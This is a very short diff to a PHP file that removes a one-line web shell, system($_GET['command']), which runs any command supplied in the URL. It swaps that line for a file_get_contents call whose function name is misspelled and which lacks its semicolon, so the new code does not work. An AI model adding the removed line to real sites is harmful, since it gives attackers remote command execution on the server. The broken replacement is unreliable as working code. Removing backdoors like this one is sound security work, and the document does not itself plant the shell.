@@ -1,4 +1,4 @@
 <?php
-system($_GET['command']);
+echo file_get_conents('en_lang.php')
 
 ?>
